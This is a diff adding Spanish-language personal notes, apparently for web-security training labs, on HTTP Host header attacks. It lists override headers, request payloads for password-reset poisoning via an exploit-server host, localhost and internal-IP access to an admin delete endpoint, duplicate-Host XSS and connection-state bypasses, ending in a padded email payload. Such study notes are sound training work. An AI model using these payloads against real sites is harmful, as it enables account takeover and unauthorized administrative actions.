@@ -1,0 +1,35 @@
+error Invalid Host Header si hay proxy inverso al manipular cabeceras
+EN INTRUDER DESMARCAR LA CASILLA UPDATE HOST HEADER
+El escaner detecta un OAST en cabecera HOST
+
+X-HTTP-Host-Override
+Forwarded
+X-Forwarded-Host
+X-Host
+X-Forwarded-Server
+
+
+Host: exploit.com --> vemos el token de forgot-password en los logs, cambiamos user nuestro por usuario enumerado
+
+GET /admin/delete?username=carlos
+Host: localhost --> desde localhost sí deja administrar sin passsword
+
+Doble Host --> si el response pinta el host 2 en algún lado, , añadir el /tracking/tracking.js correspondiente del final para inyectar un XSS en el exploitserver
+Host: academy.net
+Host: exploit-server.net
+
+si pongo /admin y sale NOT FOUND
+GET /admin
+Host: 192.168.0.§1§ --> mando al intruder 
+/delete?username=carlos&csrf=h6EewJBvUxWI4K71S2Kq32243dtRTFpC  añado parámetros si los pide después de saber IP al lado del GET
+
+GET https://server.net/admin
+Host: Host: 192.168.0.§1§ --> mando al intruder 
+/delete?username=carlos&csrf=h6EewJBvUxWI4K71S2Kq32243dtRTFpC  añado parámetros si los pide después de saber IP al lado del GET
+
+Enviamos en grupo 1 petición legit y otra así en single connection, porque sólo valida la primera conex cuando ponga Moved Permanently
+GET /admin
+Host: 192.168.0.1
+
+
+nexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconexconex@dontwannacry.com.exploit-0a1300c603ea629482f40a82013700c5.exploit-server.net
